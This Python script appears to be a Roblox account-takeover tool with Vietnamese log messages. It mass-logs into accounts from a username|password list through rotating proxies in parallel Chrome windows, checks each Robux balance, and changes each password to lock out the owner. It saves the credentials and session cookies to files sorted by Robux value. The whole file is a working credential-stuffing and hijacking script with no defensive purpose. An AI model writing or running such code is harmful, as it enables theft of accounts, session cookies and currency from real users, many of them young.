from roblox import *
from proxy_generator import ChromeProxyGenerator
from tinproxy import TinProxy, CannotFetchProxyDataError
from roblox.info import RobloxInfo
from queue import Queue
from models import RobloxAccount
from selenium.common.exceptions import WebDriverException

import os
import json
import threading
import time
import random as rand


def get_list_accounts() -> 'Queue[RobloxAccount]':
    q = Queue()

    with open(f'{os.getcwd()}\\ListAccounts.txt', encoding='utf-8') as file:
        lines = file.readlines()

        for line in lines:
            line = line.strip()
            username, password = line.split('|')

            account = RobloxAccount(username, password, '', 0)
            q.put(account)

    return q


def get_list_extensions() -> list:
    folders = os.listdir('extensions')
    list_extensions = []
    for folder in folders:
        list_extensions.append(f'{os.getcwd()}\\extensions\\{folder}')
    return list_extensions


def save_account(file_name: str, account: RobloxAccount) -> None:
    with open(f'output/{file_name}', 'a', encoding='utf-8') as file:
        file.write(f'{account.username}|{account.password}|{account.robux}/{account.cookie}\n')


def worker(lock: threading.Lock, account: RobloxAccount, chrome_proxy: ChromeProxyGenerator, chrome_size: tuple, chrome_pos: tuple):
    while True:
        r = Roblox(account.username, account.password)
        
        list_extensions = get_list_extensions()

        if tinproxy_api_key != "":
            list_extensions.append(chrome_proxy.extension_folder_path)

        r.options.add_argument(f'--load-extension={",".join(list_extensions)}')

        with lock:
            driver = r.driver
            driver.set_window_size(*chrome_size)
            driver.set_window_position(*chrome_pos)
        time.sleep(rand.uniform(2, 3))

        try:
            # check ip
            if tinproxy_api_key != "":
                driver.get('https://api.ipify.org?format=json')
                time.sleep(2.5)


            new_password = f'{account.password}1'
            account = r.login()

            info = RobloxInfo(driver, account)
            account = info.get_robux()
            messages = info.get_messages()
            has_robux = account.robux > 0
            is_credit_pending = "Robux credit pending" in messages

            if is_credit_pending:
                info.agreeRoblox()

            changePassword = info.changePassword(account.password, new_password)
            if changePassword == '{}':
                account.password = new_password

            if (is_credit_pending and has_robux) or (not is_credit_pending and has_robux):
                if is_credit_pending and has_robux:
                    file_name = 'AccMail.txt'

                if not is_credit_pending and has_robux:
                    file_name = 'AccRobux.txt'
                
                with lock:
                    save_account(file_name, account)

            if is_credit_pending and not has_robux:
                with lock:
                    save_account('AccMail.txt', account)

            break
        except CaptchaTimeout:
            print(account.username, 'Loi, thoi gian giai captcha qua lau. Dang thu lai...')
        except CookieNotFound:
            print(account.username, 'Loi, khong tim thay cookie. Dang thu lai...')
        except BannedAccount:
            print(account.username, 'Acc bi band !')
            break
        except AnUnknownError:
            print(account.username, 'Loi, khong dang nhap duoc. Dang thu lai')
        except InvalidAccount:
            print(account.username, 'Acc Sai !')
            break
        except WebDriverException as e:
            print(e)
            print(account.username, 'Loi, dang thu lai...')
        finally:
            r.close()


# create if not exist
folders = [
    'extensions',
    'output'
]
for folder in folders:
    if os.path.exists(folder):
        continue
    os.mkdir(folder)


# load config
with open('config.json', encoding='utf-8') as file:
    config = json.load(file)
user_agent = config['UserAgent']
tinproxy_api_key = config['TinProxyAPIKey']
chrome_width, chome_height = config['ChromeSize']
max_rows = config['Rows']
max_cols = config['Cols']


# setup instance
tin = TinProxy(tinproxy_api_key, user_agent)
if tinproxy_api_key != "":
    chrome_proxy = ChromeProxyGenerator(tin)
else:
    chrome_proxy = ""
list_accounts = get_list_accounts()
list_threads = []
x, y = 0, 0
lock = threading.Lock()

while not list_accounts.empty():
    if tinproxy_api_key != "":
        try:
            chrome_proxy.create_extension()
        except CannotFetchProxyDataError as e:
            print(e)
            break

    for _ in range(max_rows):
        for _ in range(max_cols):
            if not list_accounts.qsize() > 0:
                break

            account = list_accounts.get()
            list_accounts.task_done()

            save_account('Running.txt', account)

            args = (
                lock,
                account,
                chrome_proxy,
                (chrome_width, chome_height),
                (x, y),
            )

            t = threading.Thread(target=worker, args=args, daemon=True)
            list_threads.append(t)

            x += chrome_width

        x = 0
        y += chome_height

    for t in list_threads:
        t.start()
        time.sleep(.5)

    for t in list_threads:
        t.join()

    x, y = 0, 0
    list_threads.clear()
    if tinproxy_api_key != "":
        chrome_proxy.remove()

input('Done! Please press enter key to open output folder')
os.startfile('output')

